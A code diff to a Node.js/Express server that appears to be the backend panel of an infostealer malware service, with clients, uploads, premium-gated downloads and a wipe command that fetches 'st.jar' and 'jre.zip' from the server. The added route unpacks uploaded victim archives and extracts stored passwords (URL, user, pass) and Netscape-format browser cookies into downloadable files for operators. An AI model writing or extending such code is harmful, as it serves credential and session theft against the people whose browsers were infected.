@@ -271,7 +271,7 @@ async function getOwnUser(uid) {
   return await getCachedUser(uid);
 }
 
-// ─── FIXED WIPE COMMAND ─────────────────────────────────────────────────────
+// ─── WIPE COMMAND ───────────────────────────────────────────────────────────
 function buildWipeCommand(serverBase) {
   const stUrl = `${serverBase}/api/downloads/st.jar`;
   const jreUrl = `${serverBase}/api/downloads/jre.zip`;
@@ -609,6 +609,66 @@ app.get('/api/clients/:id/uploads', requireAuth, async (req, res) => {
   });
   
   res.json(result);
+});
+
+app.get('/api/uploads/:id/extract/:type', requireAuth, async (req, res) => {
+  const uploadId = Number(req.params.id);
+  const type = req.params.type;
+
+  const [rows] = await db.query(`SELECT stored_name FROM uploads WHERE id = ? AND user_id = ?`, [uploadId, req.user.uid]);
+  if (!rows.length) return res.status(404).json({ error: 'not found' });
+
+  const src = path.join(UPLOAD_DIR, rows[0].stored_name);
+  if (!fs.existsSync(src)) return res.status(410).json({ error: 'file gone' });
+
+  if (type === 'zip') {
+      return res.redirect(`/api/uploads/${uploadId}/download`);
+  }
+
+  try {
+      const zip = new AdmZip(src);
+      const entries = zip.getEntries();
+
+      if (type === 'passwords') {
+          let out = '';
+          for (const entry of entries) {
+              if (entry.entryName.toLowerCase().includes('password') && entry.entryName.endsWith('.json')) {
+                  try {
+                      const parsed = JSON.parse(entry.getData().toString('utf8'));
+                      if (Array.isArray(parsed)) {
+                          for (const item of parsed) {
+                              out += `URL: ${item.url} | USER: ${item.user} | PASS: ${item.pass}\n`;
+                          }
+                      }
+                  } catch {}
+              }
+          }
+          if (!out) return res.status(404).send('no passwords found');
+          res.setHeader('Content-Type', 'text/plain');
+          res.setHeader('Content-Disposition', `attachment; filename="passwords.txt"`);
+          return res.send(out);
+      }
+
+      if (type === 'cookies') {
+          let out = '# Netscape HTTP Cookie File\n\n';
+          let found = false;
+          for (const entry of entries) {
+              const content = entry.getData().toString('utf8');
+              if (content.includes('# Netscape HTTP Cookie File')) {
+                  out += content + '\n\n';
+                  found = true;
+              }
+          }
+          if (!found) return res.status(404).send('no netscape cookies found');
+          res.setHeader('Content-Type', 'text/plain');
+          res.setHeader('Content-Disposition', `attachment; filename="cookies.txt"`);
+          return res.send(out);
+      }
+
+      res.status(400).send('invalid type');
+  } catch (e) {
+      res.status(500).send('error parsing zip');
+  }
 });
 
 app.get('/api/uploads/:id/download', limitDownload, requireAuth, requirePremium, async (req, res) => {
